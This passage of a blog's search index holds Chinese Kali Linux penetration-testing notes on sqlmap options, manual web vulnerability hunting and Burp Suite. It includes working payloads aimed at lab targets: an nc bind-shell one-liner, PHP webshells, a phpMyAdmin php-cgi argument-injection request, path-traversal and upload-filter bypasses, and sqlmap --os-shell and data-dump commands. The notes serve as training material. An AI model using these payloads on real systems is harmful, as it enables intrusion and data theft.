          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap自动注入-General等其余参数</title>
      <link href="/posts/d760d085.html"/>
      <url>/posts/d760d085.html</url>
      
        <content type="html"><![CDATA[<h3 id="SQLMap自动注入-Injection"><a href="#SQLMap自动注入-Injection" class="headerlink" title="SQLMap自动注入-Injection"></a>SQLMap自动注入-Injection</h3><ul><li>-p<ul><li>指定扫描的参数，使–level失效</li><li>-p “user-agent,referer”</li></ul></li><li>–skip<ul><li>排除指定的扫描参数</li><li>–level=5 –skip=”id,user-agent”</li></ul></li></ul><a id="more"></a><ul><li>uri注入点<ul><li>sqlmap -u “<a href="http://targeturl/param1/value1*/param2/value2/&quot;" target="_blank" rel="noopener">http://targeturl/param1/value1*/param2/value2/&quot;</a></li><li>在参数的地方加个*即可</li></ul></li><li>–dbms=”mysql”</li><li>–os<ul><li>Linux</li><li>Windows</li></ul></li><li>–invalid-bignum/–invalid-logical<ul><li>通常sqlmap使用负值使参数取值失效 id=13-&gt;id=-13</li><li>bignum使用大数使参数时效，id=99999999</li><li>logical使用布尔判断使参数失效，id=13 and 19</li></ul></li><li>–no-cast<ul><li>榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换null</li><li>老版本数据库开启此开关</li></ul></li><li>–no-escape<ul><li>出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap使用char()编码逃逸的方法替换字符串</li><li>select ‘foo’ –&gt; select char(102)+char(111)+char(111)</li><li>本参数将关闭此功能</li></ul></li><li>–prefix/–suffix<ul><li>比如服务器端代码是$query = “select * from users where id = (‘“.$_GET[‘id’]”.”‘) limit 0,1”;</li><li>sqlmap -u “<a href="http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot;</a> -p id –prefix “‘)’” –suffix “and (‘abc’=’abc”</li><li>注入后：query=”select * from users where id=(‘1’) &lt;PAYLOAD&gt; and (‘abc’=’abc’) limit 0,1”;</li></ul></li><li>–tamper（实际渗透测试中经常使用的）<ul><li>混淆脚本，用于绕过应用层过滤、IPS、WAF</li><li>sqlmap -u “xxxxx” –tamper=”between.py,randomcase.py,spcae2comment.py”</li></ul></li></ul><h3 id="SQLMap自动注入-Detection"><a href="#SQLMap自动注入-Detection" class="headerlink" title="SQLMap自动注入-Detection"></a>SQLMap自动注入-Detection</h3><ul><li><p>–level</p><ul><li>1-5级（默认1）</li><li>/usr/share/sqlmap/data/xml/payloads#</li></ul></li><li><p>–risk</p><ul><li><p>1-4（默认1/无害）</p></li><li><p>Risk升高可造成数据被篡改等风险</p></li></ul></li><li><p>–string,–not-string,–regexp,–code,–text-only,–titles</p><ul><li>页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑，但有些页面随时间变化，此时需要人为指定标志真假的条件。</li></ul></li></ul><h3 id="SQLMap自动注入-Techniques"><a href="#SQLMap自动注入-Techniques" class="headerlink" title="SQLMap自动注入-Techniques"></a>SQLMap自动注入-Techniques</h3><ul><li><p>默认使用全部技术</p><ul><li>B:Boolean-based blind</li><li>E:Error-based</li><li>U:Union query-based</li><li>S:Stacked queries(文件系统，操作系统、注册表必须)</li><li>T:Time-Based blind</li></ul></li><li><p>–time-sec</p><ul><li>基于时间的注入检测相应延迟时间（默认5秒）</li></ul></li><li><p>–union-cols</p><ul><li>默认联合查询1-10列，随–level增加最多支持50列</li><li>–union-cols 6-9</li></ul></li><li><p>–union-char</p><ul><li>对于不需要查询的，联合查询默认使用null，极端情况下null可能失败，此时可以手动指定数值</li><li>–union-char 123</li></ul></li><li><p>–dns-domain</p><ul><li>攻击者控制了某dns服务器，使用此功能提高数据榨取的速度</li><li>–dns-domain xxxxx.com</li></ul></li><li><p>–second-order</p><ul><li>在一个页面注入的结果，从另一个页面体现出来</li><li>–second-order <a href="http://1.1.1.1/b.php" target="_blank" rel="noopener">http://1.1.1.1/b.php</a></li></ul></li></ul><h3 id="SQLMap自动注入-Fingerprint"><a href="#SQLMap自动注入-Fingerprint" class="headerlink" title="SQLMap自动注入-Fingerprint"></a>SQLMap自动注入-Fingerprint</h3><ul><li>-f,–fingerprint,-b,–banner<ul><li>DBMS指纹信息</li><li>DBMS，操作系统，架构，补丁</li></ul></li></ul><h3 id="SQLMap自动注入-Enumration"><a href="#SQLMap自动注入-Enumration" class="headerlink" title="SQLMap自动注入-Enumration"></a>SQLMap自动注入-Enumration</h3><ul><li>–current-user<ul><li>查询当前DBMS账号</li></ul></li><li>–current-db</li><li>–hostname</li><li>–users</li><li>–privileges -U username(可以不跟 -U)</li><li>–roles</li><li>–dbs<ul><li>-D database –tables</li><li>-D database -T table –colums</li><li>-D database -T table -C colum –columns</li><li>–exclude-sysdbs</li><li>–count</li><li>–schema</li><li>–batch所有需要选择的都使用默认</li></ul></li><li>Dump数据<ul><li>–dump，-C,-T,-D,–start,–stop</li><li>–dump-all</li><li>–sql-query     ‘’select * from users’’</li></ul></li></ul><h3 id="SQLMap自动注入-BruteForce"><a href="#SQLMap自动注入-BruteForce" class="headerlink" title="SQLMap自动注入-BruteForce"></a>SQLMap自动注入-BruteForce</h3><ul><li>当无权读取information_schema库时</li><li>微软的access数据库，默认无权读取MSysObjects库</li><li>–common-tables（爆破表名）</li><li>–common-columns（爆破列名，Access系统表无列信息）</li></ul><h3 id="SQLMap自动注入-User-Defined-Function-Injections"><a href="#SQLMap自动注入-User-Defined-Function-Injections" class="headerlink" title="SQLMap自动注入-User Defined Function Injections"></a>SQLMap自动注入-User Defined Function Injections</h3><ul><li>–udf-inject,–shared-lib<ul><li>编译共享库创建并上传至DBServer，以此生成UDF实现高级注入</li><li>Linux：shared object</li><li>Windows：DLL</li></ul></li></ul><h3 id="SQLMap自动注入-FileSystem"><a href="#SQLMap自动注入-FileSystem" class="headerlink" title="SQLMap自动注入-FileSystem"></a>SQLMap自动注入-FileSystem</h3><ul><li>–file-read=”/etc/passwd”</li><li>–file-write=”/path/file” –file-dest “/tmp/file”</li></ul><h3 id="SQLMap自动注入-OS"><a href="#SQLMap自动注入-OS" class="headerlink" title="SQLMap自动注入-OS"></a>SQLMap自动注入-OS</h3><ul><li><p>Mysql、postgresql</p><ul><li>上传共享库并生成sys_exec()、sys_eval()两个udf</li></ul></li><li><p>mssql</p><ul><li>xp_cmdshell存储过程（漏洞）（有就用，禁了启，没有建）</li></ul></li><li><p>–os-cmd </p></li><li><p>–os-shell</p></li><li><p>–sql-shell</p></li></ul><h3 id="SQLMap自动注入-WindowsRegistory"><a href="#SQLMap自动注入-WindowsRegistory" class="headerlink" title="SQLMap自动注入-WindowsRegistory"></a>SQLMap自动注入-WindowsRegistory</h3><ul><li>–reg-read</li><li>–reg-add</li><li>–reg-del</li><li>–reg-key、–reg-value、–reg-data、–reg-type</li><li>sqlmap -u=”<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –reg-add –reg-key=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1</li></ul><h3 id="SQLMap自动注入-General"><a href="#SQLMap自动注入-General" class="headerlink" title="SQLMap自动注入-General"></a>SQLMap自动注入-General</h3><ul><li><p>-s：sqllite会话文件保存位置</p><ul><li>默认保存在~/.sqlmap/output</li></ul></li><li><p>-t：记录流量文件保存位置</p></li><li><p>–charset：强制字符编码</p><ul><li>–charset=GBK</li></ul></li><li><p>–crawl：从起始位置爬站深度</p><ul><li>–batch –crawl=3</li></ul></li><li><p>–csv-del：dump数据默认存于“，”分割的CSV文件中，指定其它分隔符</p><ul><li>–csv-del”;”</li></ul></li><li><p>–dbms-cred：指定数据库账号（credential）</p></li><li><p>–flush-session：清除缓存，再查就是重新查询</p></li><li><p>–force-ssl：访问https</p></li><li><p>–fresh-quries：直接重新查，不清缓存</p></li><li><p>–hex：dump非ASCII字符内容时，将其编码为16进制，收到后解码还原</p><ul><li>sqlmap -u “<a href="http://1.1.1.1/s.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/s.php?id=1&quot;</a> –hex -v 3</li></ul></li><li><p>–parse-errors:分析和显示数据库内建报错信息</p></li><li><p>–save：将命令保存成配置文件</p><ul><li>指定保存位置</li></ul></li></ul><p>SQLMap自动注入-Miscellaneous</p><ul><li>-z：参数帮助记符</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap自动注入-Request、Optimization</title>
      <link href="/posts/d7de118c.html"/>
      <url>/posts/d7de118c.html</url>
      
        <content type="html"><![CDATA[<h3 id="SQLMap自动注入-Request"><a href="#SQLMap自动注入-Request" class="headerlink" title="SQLMap自动注入-Request"></a>SQLMap自动注入-Request</h3><h5 id="基本数据"><a href="#基本数据" class="headerlink" title="基本数据"></a>基本数据</h5><ul><li>数据段： –data<ul><li>get/post都使用</li><li>sqlmap -u “<a href="http://1.1.1.1/a.php”" target="_blank" rel="noopener">http://1.1.1.1/a.php”</a> –data=”user=1&amp;pass=2”-f</li></ul></li><li>变量分隔符：–param-del<ul><li><a href="http://1.1.1.1/a.php?q=foo;id=1" target="_blank" rel="noopener">http://1.1.1.1/a.php?q=foo;id=1</a>    //用；替换&amp;</li><li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”q=foo;id=1” –param-del=”;” -f</li></ul></li></ul><a id="more"></a><ul><li>cookie头：–cookie<ul><li>web应用需要基于cookie的身份认证</li><li>检查cookie中的注入点（sqlmap自动测试，当扫描level&gt;=2时才会检查，–level 2）</li><li>Set-Cookie(sqlmap会自动检测，使用新的cookie)/–drop-set-cookie（drop掉，还使用原来的cookie）</li><li>sqlmap -u “xxx” –cookie=”key1=1;key2=2”</li></ul></li><li>–user-agent<ul><li>sqlmap检查user-agent中的注入点需要level&gt;=3</li></ul></li><li>–random-agent<ul><li>/usr/share/sqlmap/txt/user-agents.txt,字典中随机抽取</li></ul></li><li>Host头：–host=“xxx”<ul><li>level=5</li></ul></li><li>referer头：–referrer<ul><li>level&gt;=3</li></ul></li><li>额外的header：–headers=”Host:xxxxx\nUser=Agent:xxxxxxxxxxx\nxxxx:xxx”<ul><li>注意用换行符分隔。注意大小写。</li></ul></li><li>–method=GET/POST</li></ul><h5 id="基于http协议的身份验证"><a href="#基于http协议的身份验证" class="headerlink" title="基于http协议的身份验证"></a>基于http协议的身份验证</h5><ul><li>Basic</li><li>Digest</li><li>NTLM</li><li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –auth-type Basic –auth-cred “user:pass”</li><li>–auth-cert/–auth-file<ul><li>–auth-file=”ca.PEM”</li><li>含有私钥的PEM格式证书文件</li><li>PEM格式的证书链文件</li></ul></li></ul><h5 id="http-s-代理"><a href="#http-s-代理" class="headerlink" title="http(s)代理"></a>http(s)代理</h5><ul><li>–proxy=”<a href="http://127.0.0.1:8087&quot;">http://127.0.0.1:8087&quot;</a></li><li>–proxy-cerd=”user:pass”</li><li>–ignore-proxy<ul><li>忽略系统代理，通常用于扫描本地网络目标。</li></ul></li></ul><h5 id="请求控制"><a href="#请求控制" class="headerlink" title="请求控制"></a>请求控制</h5><ul><li><p>–delay</p><ul><li>每次http(s)请求之间延迟时间，浮点数，单位为秒，默认无延迟</li></ul></li><li><p>–timeout</p><ul><li>请求超时时间，浮点数，默认为30秒</li></ul></li><li><p>–retries</p><ul><li>http(s)连接超时重试次数，默认三次</li></ul></li><li><p>–randomize</p><ul><li><p>长度、类型与原始值保持一致前提下，指定每次请求随机取值的参数名</p></li><li><p>sqlmap -u <a href="http://1.1.1.1/a.php?id=100" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=100</a> -randomize=”id”</p></li></ul></li><li><p>–scope</p><ul><li>过滤日志内容，通过正则表达式筛选扫描对象</li><li>sqlmap -l burp.log –scope=”(www)?.target.(com|net|org)”</li><li>sqlmap -l 2.log –scope</li></ul></li><li><p>–safe-url/–safe-freq</p><ul><li>检测和盲注截断会产生大量失败请求，服务器端可能因此销毁session</li><li>每发送–safe-freq次诸如请求后，发送一次正常请求</li></ul></li><li><p>–skip-urlencode</p><ul><li>默认get方法会对传输内容进行编码，但是有些web服务器不遵守rfc标准，使用原始字符。</li></ul></li><li><p>–eval</p><ul><li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&amp;hash=c1515a15b1dd15xxx&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&amp;hash=c1515a15b1dd15xxx&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</li></ul></li></ul><h3 id="SQLMap自动注入-Optimization"><a href="#SQLMap自动注入-Optimization" class="headerlink" title="SQLMap自动注入-Optimization"></a>SQLMap自动注入-Optimization</h3><ul><li>优化性能</li><li>–predict-output<ul><li>根据检测方法，对比返回值和统计表内容，不断缩小检测范围（数据库类型版本等），提高检测效率</li><li>通过 版本名、用户名、密码、Privileges、role、数据库名称、表名、列名等判断</li><li>与–threads参数不兼容</li><li>统计表：/usr/share/sqlmap/txt/common-outputs.txt</li></ul></li><li>–keep-alive<ul><li>使用http(s)长连接，性能好</li><li>与–proxy参数不兼容</li><li>避免重复建立网络连接的开销，但大量长连接会严重占用服务器资源</li></ul></li><li>–null-connection<ul><li>只获取相应页面的大小，而不是具体内容</li><li>通常用于盲注判断 真/假，降低网络带宽消耗。比如页面会回传图片</li><li>与–text-only参数不兼容（基于页面内容比较判断真/假）<ul><li>若是HTTP响应体中有许多诸如JavaScript之类的活动内容，可以使用参数“–text-only”让Sqlmap只专注于纯文本内容。</li></ul></li></ul></li><li>–threads<ul><li>最大并发线程</li><li>盲注时每个线程获取一个字符（7次请求，因为第一位是0，高位ascii码键盘上没有），获取完成后线程结束</li><li>默认值为1，建议不要超过10，否则可能影响站点可用性</li><li>与–predict-output参数不兼容</li></ul></li><li>-o 开启前三个性能参数（除–threads参数）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap自动注入-Target</title>
      <link href="/posts/b434380f.html"/>
      <url>/posts/b434380f.html</url>
      
        <content type="html"><![CDATA[<h3 id="SQLMap自动注入"><a href="#SQLMap自动注入" class="headerlink" title="SQLMap自动注入"></a>SQLMap自动注入</h3><ul><li>开源sql注入漏洞检测、利用工具</li><li>检测动态页面中get/post参数、cookie、http头</li><li>数据榨取</li><li>文件系统访问</li><li>操作系统命令执行</li><li>引擎强大、特性丰富</li><li>Xss漏洞检测</li></ul><a id="more"></a><h4 id="五种检测技术"><a href="#五种检测技术" class="headerlink" title="五种检测技术"></a>五种检测技术</h4><ul><li>基于布尔的盲注检测</li><li>基于时间的盲注检测<ul><li>‘ and (select * from (select(sleep(20)))a)– </li></ul></li><li>基于错误的检测</li><li>基于UNION联合查询的检测<ul><li>适用于通过for循环直接输出联合查询结果，否则只显示第一项结果。</li></ul></li><li>基于堆叠查询的检测<ul><li>；堆叠多个查询语句</li><li>适用于非select的数据修改、删除操作</li></ul></li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul><li>数据库直连 -d</li><li>与burpsuite、google结合使用，支持正则表达式限定测试目标。</li><li>Get、post、cookie、referer、User_Agent（随机或指定）<ul><li>Cookie过期后自动处理Set-Cookie头，更新cookie信息</li></ul></li><li>限速：最大并发，延迟并发</li><li>支持Basic、Digest、NTLM、CA身份认证</li><li>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表、列名称</li><li>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问Windows注册表</li><li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门。</li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><h5 id="GET方法测试"><a href="#GET方法测试" class="headerlink" title="GET方法测试"></a>GET方法测试</h5><ul><li>-u ，要测试的链接<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot;</code></li></ul></li><li>-f，获得数据库指纹信息</li><li>–users，获得数据库用户数据</li><li>–banner，获得banner信息</li><li>–dbs，目标数据库中有哪些库<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; --dbs</code></li></ul></li><li>-D 数据库 –tables,查看库中有哪些表<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa --tables</code></li></ul></li><li>-D 数据库 -T 表名 –columns<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa -T users --columns</code></li></ul></li><li>-dump<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa -T users -dump</code></li></ul></li><li>–schema，元数据</li><li>-a ，所有的</li><li>-d，直连 <ul><li><code>sqlmap -d &quot;mysql://user:password@192.168.20.10:3306/dvwa -f --users&quot;</code></li></ul></li><li>-m，要测试链接列表文件</li><li>-g，扫描google搜索结果<ul><li><code>sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></li></ul></li></ul><h5 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h5><ul><li>使用http请求文件（直接把burpsuite拦截到的请求粘贴到文本文件）<ul><li><code>sqlmap -r request.txt --dbs</code></li></ul></li><li>使用burpsuitelog文件（burpsuite的Option-&gt;misc-&gt;logging）<ul><li><code>sqlmap -l log.txt</code></li></ul></li></ul><h5 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h5><ul><li><code>sqlmap -u &quot;xxxxxxxxxxxxxx&quot; --force-ssl</code></li></ul><h5 id="扫描配置文件"><a href="#扫描配置文件" class="headerlink" title="扫描配置文件"></a>扫描配置文件</h5><ul><li><code>sqlmap -c sqlmap.conf</code></li><li>默认的config文件/etc/sqlmap/sqlmap.conf</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动漏洞挖掘-命令执行、目录遍历、文件包含、文件上传</title>
      <link href="/posts/a99fb23a.html"/>
      <url>/posts/a99fb23a.html</url>
      
        <content type="html"><![CDATA[<h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><h4 id="账号密码"><a href="#账号密码" class="headerlink" title="账号密码"></a>账号密码</h4><ul><li>常用弱口令/基于字典的密码爆破</li><li>锁定账号<ul><li>先手动多试几次，如果没有锁定机制，就可以爆破。</li></ul></li><li>信息收集<ul><li>手机号</li><li>密码错误提示信息<ul><li>一些隐藏的信息比如错误码</li></ul></li><li>去分站搜集账号相关信息</li></ul></li></ul><a id="more"></a><ul><li>密码嗅探</li><li>密码找回<ul><li>重置密码的url，观察随机数位数，128（MD5），160（SHA1），256（SHA2）</li><li></li></ul></li></ul><h4 id="会话sessionID"><a href="#会话sessionID" class="headerlink" title="会话sessionID"></a>会话sessionID</h4><ul><li>Xss/cookie importer</li><li>SessionID in URL</li><li>嗅探</li><li>SessionID 长期不变/永久不变</li><li>SessionID  生成算法<ul><li>Sequencer</li><li>私有算法(不建议使用，可能被破解)</li><li>预判下一次登陆时生成的SessionID</li><li>登出后点击返回测试，看sessionID是否失效</li></ul></li></ul><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><ul><li>应用程序开发者直接调用操作系统功能<ul><li>；    &amp;&amp;    |    ||    &amp;</li><li>；mkfifo /tmp/pipe;sh /tmp/pipe|nc -nlp 4444&gt; /tmp/pipe</li></ul></li></ul><h3 id="目录遍历、文件包含"><a href="#目录遍历、文件包含" class="headerlink" title="目录遍历、文件包含"></a>目录遍历、文件包含</h3><ul><li><p>Directory traversal（可以读取web目录外的其它目录文件）/File include（操作系统其它位置文件被include到web目录）</p><ul><li>目录权限限制不严/文件包含</li></ul></li><li><p>/etc/php5/cgi/php/ini</p><ul><li>allow_url_include = on<ul><li>sudo /etc/init.d/apache2 restart</li></ul></li></ul></li><li><p>特征</p><ul><li>?page=a.php</li><li>?home=b.html</li><li>?file=content</li><li>url中的值=页面（也有可能在cookie中）</li></ul></li><li><p>经典测试方法</p><ul><li>?file=../../../../etc/passwd</li><li>?page=file:///etc/passwd</li><li>?home=</li></ul></li><li><p>编码绕过字符过滤</p><ul><li>“.”    “%00”    #绕过文件拓展名过滤</li><li>url编码、双层url编码<ul><li>%2e%2e%2f    ../</li><li>%2e%2e%5c    ..\</li><li>%252e%252e%252c    ..\</li></ul></li><li>Unicode/UTF-8编码</li><li>Base64</li><li>ASCII hex</li></ul></li><li><p>只过滤一次的绕过：</p><ul><li>如果过滤规则是abcd,则ab abcd cd,过滤掉中间的之后，又会构成</li></ul></li><li><p>其它系统路径可能使用到的字符</p><ul><li>file.txt…</li><li>file.txt&lt;space&gt;</li><li>file.txt””””</li><li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;&lt;</li><li>./././file.txt</li><li>nonexistant/../file.txt</li><li>UNC路径<ul><li>\1.1.1.1\path\to\file.txt</li></ul></li></ul></li><li><p>本地文件包含 lfi</p><ul><li>查看文件</li><li>代码执行<ul><li>&lt;?php echo shell exec ($_GET[‘cmd’])?&gt;</li><li>Apache access.log</li></ul></li></ul></li><li><p>/usr/share/wfuzz/wordlist/vulns</p></li></ul><h4 id="生成自己的字典文件"><a href="#生成自己的字典文件" class="headerlink" title="生成自己的字典文件"></a>生成自己的字典文件</h4><ul><li>用以上编码及各种编码的组合生成测试的字典文件</li></ul><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul><li>文件上传漏洞<ul><li>一句话webshell<ul><li>&lt;?php echo shell exec ($_GET[‘cmd’])?&gt;</li></ul></li><li>绕过：<ul><li>mimetype</li><li>size</li><li>name</li><li>文件内容的前几个字节，（把webshell写到图片的数据段）<ul><li>a.php.jpeg</li></ul></li></ul></li><li>防护：<ul><li>删除上传文件的目录的执行权限</li></ul></li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>放弃无限定范围的爆破。</p></li><li><p>所有需要生成随机值的地方都要关注随机性。</p></li><li><p>符号提交时尝试编码</p></li></ul><h4 id="手动漏洞挖掘原则（重要！！！）"><a href="#手动漏洞挖掘原则（重要！！！）" class="headerlink" title="手动漏洞挖掘原则（重要！！！）"></a>手动漏洞挖掘原则（重要！！！）</h4><ul><li><p>所有变量都要尝试！</p></li><li><p>所有头</p><ul><li>Cookie中的变量</li></ul></li><li><p>逐个变量删除,没有影响的东西可以删掉。</p></li></ul><h4 id="漏洞的本质"><a href="#漏洞的本质" class="headerlink" title="漏洞的本质"></a>漏洞的本质</h4><ul><li>数据和指令的混淆</li><li>对用户输入信息过滤不严，判断失误</li></ul><h4 id="如何做"><a href="#如何做" class="headerlink" title="如何做"></a>如何做</h4><ul><li>首先了解常见漏洞类型，当检测时，就全部都尝试一遍。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动漏洞挖掘.默认安装</title>
      <link href="/posts/5d18e643.html"/>
      <url>/posts/5d18e643.html</url>
      
        <content type="html"><![CDATA[<h3 id="手动漏洞挖掘-默认安装"><a href="#手动漏洞挖掘-默认安装" class="headerlink" title="手动漏洞挖掘-默认安装"></a>手动漏洞挖掘-默认安装</h3><ul><li><p>Windows默认安装漏洞</p></li><li><p>phpMyAdmin/setup</p><ul><li>MetaSploitable<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST http:&#x2F;&#x2F;&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 192.168.20.10<br>Content-Length: 40<br><br>&lt;?php<br>passthru(&#39;pwd&amp;&amp;ls&#39;); <br>die();<br>?&gt;<br></code></pre></td></tr></table></figure><img src="/posts/5d18e643/pic1.png" alt></li></ul><a id="more"></a><ul><li>写入webshell</li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo&quot;&lt;?php\$cmd&#x3D;\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot;&gt;&#x2F;var&#x2F;www&#x2F;3.php<br></code></pre></td></tr></table></figure><ul><li><p>PHP反弹shell</p><ul><li><code>/usr/share/webshells/php/php-reverse-shell.php</code></li><li>直接把内容用burp发送，然后在本地用nc侦听，记得修改php文件里面的ip地址</li></ul></li><li><p>侦听shell</p></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo system(&#39;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe|nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe&#39;);<br></code></pre></td></tr></table></figure><ul><li><p>File</p><ul><li>如果当前用户没有权限执行ifconfig，先用whereis 查看ifconfig的路径，然后到目录下使用./执行。</li></ul></li></ul><ul><li><p>Ubuntu/Debian默认安装PHP5-cgi</p></li><li><p>可直接访问/cgi-bin/php5和/cgi-bin/php(爬不出来的目录</p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路：先检查默认安装的软件是否有相关漏洞</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web扫描工具-Burpsuite</title>
      <link href="/posts/1ee974b7.html"/>
      <url>/posts/1ee974b7.html</url>
      
        <content type="html"><![CDATA[<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><ul><li>Web安全工具中的瑞士军刀</li><li>统一的集成工具发现全部现代安全漏洞</li><li>PortSwigger公司开发<ul><li>Burp Free</li><li>Burp Professional</li><li><a href="http://www.portswigger.net" target="_blank" rel="noopener">http://www.portswigger.net</a></li></ul></li><li>所有的工具共享一个能处理并显示HTTP消息的可拓展框架，模块之间无缝交换信息。</li></ul><a id="more"></a><ul><li>字体调成中文</li></ul><h4 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h4><ul><li>Options<ul><li>Invisible（主机头/多目标域名）</li><li>CA（导入/导出）</li></ul></li></ul><h4 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h4><ul><li>Position<ul><li>Sniper<ul><li>逐一变量进行内容插入，其它变量不变</li></ul></li><li>Battering ram<ul><li>两个位置同时插入同样值</li></ul></li><li>Pitchfork<ul><li>成对</li></ul></li><li>Cluster bomb<ul><li>尝试所有排列组合</li></ul></li></ul></li><li>熟悉操作</li></ul><h4 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h4><ul><li>熟悉操作</li></ul><h4 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h4><ul><li>分析程序中可预测的数据<ul><li>Session cookies</li><li>anti-CSRF tokens</li><li>Start live capture<ul><li>Analyze(数据越多分析越准确)</li><li>伪随机数算法</li><li>Character-level</li><li>Bit-level</li></ul></li></ul></li><li>FIPS——美国联邦信息处理标准（Federal Information Processing Standard）</li></ul><h4 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h4><ul><li>熟悉操作</li></ul><h4 id="Compare"><a href="#Compare" class="headerlink" title="Compare"></a>Compare</h4><ul><li>熟悉操作</li></ul><h3 id="其它扫描器"><a href="#其它扫描器" class="headerlink" title="其它扫描器"></a>其它扫描器</h3><ul><li><p>AWVS</p></li><li><p>AppScan</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
